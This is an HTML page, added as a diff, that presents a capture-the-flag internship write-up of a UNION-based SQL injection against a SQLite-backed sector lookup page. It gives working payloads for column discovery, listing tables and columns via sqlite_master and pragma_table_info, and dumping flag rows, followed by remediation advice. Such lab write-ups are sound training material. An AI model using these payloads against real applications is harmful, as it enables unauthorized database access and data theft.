@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SQL Injection &mdash; Breach Reconstruction Log</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=VT323&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/terminal-theme.css">
+<style>
+  .shot{ margin:1.2rem 0 1.6rem; }
+  .shot img{ max-width:100%; border:1px solid var(--border-dim); border-radius:4px; display:block; }
+  .badge-row{ display:flex; flex-wrap:wrap; gap:.5rem; justify-content:center; margin-top:1rem; }
+  .badge-row span{ font-size:11px; letter-spacing:.08em; text-transform:uppercase; color:var(--green-dim); border:1px solid var(--border); padding:.25rem .6rem; border-radius:20px; }
+</style>
+</head>
+<body class="flicker">
+<div class="crt-overlay" aria-hidden="true"></div>
+
+<div class="terminal-shell">
+
+  <header class="term-titlebar">
+    <div class="dots"><span></span><span></span><span></span></div>
+    <a href="../index.html" style="border:none;color:var(--green-dim);flex-shrink:0;">&larr; ./home</a>
+    <div class="term-path">root@mwr:~/sqli#</div>
+    <div class="term-status"><span class="dot-live" aria-hidden="true"></span> SESSION ACTIVE</div>
+  </header>
+
+  <section class="hero" id="top">
+    <p class="hero-eyebrow">mwr internship log</p>
+    <div class="hero-frame">
+      <h1>SQL INJECTION<small>MWR Dec 2025 Internship · web</small></h1>
+    </div>
+    <div class="hero-meta">
+      <span>PROGRAM <b>MWR Internship</b></span>
+      <span>CATEGORY <b>SQL Injection</b></span>
+    </div>
+    <div class="badge-row"><span>sqli</span> <span>union-based</span> <span>web</span></div>
+    <a class="scroll-cue" href="#flags">&#9660; scroll to begin</a>
+  </section>
+
+  <div class="layout">
+    <nav class="sidenav" aria-label="Section navigation">
+      <div class="nav-prompt">┌──(reader@you)-[~]
+└─$ ls -la sections/</div>
+      <ul id="navList">
+        <li><a href="#flags">flags.txt</a></li>
+        <li><a href="#f0">01_sqli.md</a></li>
+      </ul>
+    </nav>
+
+    <main class="content">
+      
+      <section id="flags" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat flags.txt</span></div>
+        <h2>flag captured</h2>
+        <div class="flag-block"><div class="label">flag</div><code>MWR{fl4g_h3r3}</code></div>
+      </section>
+      
+      <section id="f0" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 01_sqli.md</span></div>
+        <h2>sql injection report</h2>
+        <div class="block-body"><p>web application page that accepts a sector_number parameter and returns sector_details.<br>A UNION-based SQL injection in a sector_details query allowed disclosure of internal SQLite tables and a flagged event<br>The injection point is inside a single-quoted parameter. The database backend is SQLite (identified via the no such table: information_schema.tables error and the presence of sqlite_master).</p></div>
+<h3>CTF Writeup — "Zion" SQL Injection (SQLite)</h3>
+<div class="block-body"><p><strong>Author:</strong> Kipruto (submission)</p></div>
+<div class="block-body"><p><strong>Target:</strong> web application page that accepts a <code>sector_number</code> parameter and returns <code>sector_details</code>.</p></div>
+<div class="block-body"><p><strong>Date tested:</strong> (CTF)</p></div>
+<div class="block-body"><p><strong>Summary:</strong><br>A UNION-based SQL injection in a <code>sector_details</code> query allowed disclosure of internal SQLite tables and a flagged event containing the CTF flag <code>MWR{fl4g_h3r3}</code>. The injection point is inside a single-quoted parameter. The database backend is <strong>SQLite</strong> (identified via the <code>no such table: information_schema.tables</code> error and the presence of <code>sqlite_master</code>).</p></div>
+<div class="block-body"><p>---</p></div>
+<h4>1. Initial reconnaissance</h4>
+<div class="block-body"><p>&bull; Visited the "Select a Sector" page and controlled the <code>sector_number</code> parameter.</p></div>
+<div class="block-body"><p>&bull; Observed an error when trying to query <code>information_schema.tables</code>:</p></div>
+<div class="block-body"><p>Query malformed: no such table: information_schema.tables</p></div>
+<div class="block-body"><p>Executed Query:<br>SELECT * FROM sector_details WHERE sector_number = '"Zion"' union SELECT * FROM information_schema.tables; -- -'</p></div>
+<figure class="shot"><img width="1053" height="616" alt="image" src="https://github.com/user-attachments/assets/bbefbb4e-13a1-42cd-9e83-4ee17f30bb32" /></figure>
+<div class="block-body"><p>&bull; Error indicates the backend is <strong>SQLite</strong> (no <code>information_schema</code>). <code>sqlite_master</code> is the appropriate schema table.</p></div>
+<h4>2. Determining injection characteristics</h4>
+<div class="block-body"><p>&bull; Confirmed the injection occurs inside a single-quoted string (payload must close the existing <code>'</code>).</p></div>
+<div class="block-body"><p>&bull; Found correct <code>UNION</code> column layout by testing with <code>NULL</code> placeholders.</p></div>
+<div class="block-body"><p>&bull; Discovered there are <strong>5 columns</strong> in the original <code>SELECT</code> and the <strong>second column</strong> is reflected in the page's output.</p></div>
+<div class="block-body"><p>Example successful enumeration payload used to list tables:<br>' UNION SELECT NULL, group_concat(name), NULL, NULL, NULL FROM sqlite_master WHERE type='table'--</p></div>
+<figure class="shot"><img width="1017" height="816" alt="image" src="https://github.com/user-attachments/assets/9606c259-8925-44b0-9fde-3e1281951bf9" /></figure>
+<div class="block-body"><p>fl4gged_events,sqlite_sequence,jokes,sector_details,users</p></div>
+<h4>3. Exploitation — enumerating schema and extracting data</h4>
+<div class="block-body"><p>Because this is SQLite, <code>sqlite_master</code> and <code>pragma_table_info(...)</code> were used.</p></div>
+<h4>3.1 List tables (already discovered)</h4>
+<div class="block-body"><p>' UNION SELECT NULL, group_concat(name), NULL, NULL, NULL FROM sqlite_master WHERE type='table'--</p></div>
+<h4>3.2 List columns for a table (example: <code>fl4gged_events</code>)</h4>
+<div class="block-body"><p>' UNION SELECT NULL, group_concat(name), NULL, NULL, NULL FROM pragma_table_info('fl4gged_events')--</p></div>
+<figure class="shot"><img width="984" height="759" alt="image" src="https://github.com/user-attachments/assets/c4ec1b29-275c-4736-b8e0-9c0c03eec203" /></figure>
+<h4>3.3 Count rows (example: <code>fl4gged_events</code>)</h4>
+<div class="block-body"><p>' UNION SELECT NULL, count(*), NULL, NULL, NULL FROM fl4gged_events--</p></div>
+<figure class="shot"><img width="993" height="770" alt="image" src="https://github.com/user-attachments/assets/e9f7984b-4141-439f-a811-be878f5a781f" /></figure>
+<h4>3.4 Dump rows (concatenate fields)</h4>
+<div class="block-body"><p>Row-by-row extraction using <code>LIMIT 1 OFFSET {i}</code>:<br>' UNION SELECT NULL, (timestamp || ':' || activity), NULL, NULL, NULL FROM fl4gged_events LIMIT 1 OFFSET 0--</p></div>
+<figure class="shot"><img width="1016" height="819" alt="image" src="https://github.com/user-attachments/assets/9474c464-b659-4312-8405-aa651ef40318" /></figure>
+<div class="block-body"><p>' UNION SELECT NULL, (timestamp || ':' || activity), NULL, NULL, NULL FROM fl4gged_events LIMIT 1 OFFSET 1--</p></div>
+<figure class="shot"><img width="1017" height="847" alt="image" src="https://github.com/user-attachments/assets/26870353-b1f1-4c1c-a847-326d386cf1d4" /></figure>
+<h4>5. Remediation and recommendations</h4>
+<div class="block-body"><p>1. <strong>Use parameterized queries / prepared statements</strong> — never concatenate user input into SQL statements. Bind <code>sector_number</code> as a parameter.<br>2. <strong>Least privilege for DB user</strong> — the web application should use an account with only the necessary rights and not expose metadata tables where possible.<br>3. <strong>Input validation &amp; whitelisting</strong> — validate <code>sector_number</code> against allowed formats or IDs server-side before using it in queries.<br>4. <strong>Error handling</strong> — do not leak raw database errors to the user; use generic error messages and server-side logging for diagnostics.<br>5. <strong>WAF/filters are not a replacement</strong> — do not rely on filtering only; fix the root cause (parameterization).<br>6. <strong>Output encoding / escaping</strong> — ensure any reflected content is properly escaped/encoded to avoid information disclosure or XSS.</p></div>
+
+      </section>
+    </main>
+  </div>
+
+  <footer class="term-footer">
+    <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cursor">&#9612;</span></div>
+    <p>Raw session log, lightly reformatted for the theme. Nothing paraphrased or added beyond what's in the original notes.</p>
+  </footer>
+
+</div>
+
+<script>
+(function(){
+  var links = Array.prototype.slice.call(document.querySelectorAll('#navList a'));
+  var sections = links.map(function(a){ return document.querySelector(a.getAttribute('href')); }).filter(Boolean);
+  if ('IntersectionObserver' in window && sections.length){
+    var map = {};
+    sections.forEach(function(s, idx){ map[s.id] = links[idx]; });
+    var obs = new IntersectionObserver(function(entries){
+      entries.forEach(function(entry){
+        var link = map[entry.target.id];
+        if (!link) return;
+        if (entry.isIntersecting){
+          links.forEach(function(l){ l.classList.remove('active'); });
+          link.classList.add('active');
+        }
+      });
+    }, { rootMargin: '-15% 0px -70% 0px', threshold: 0 });
+    sections.forEach(function(s){ obs.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
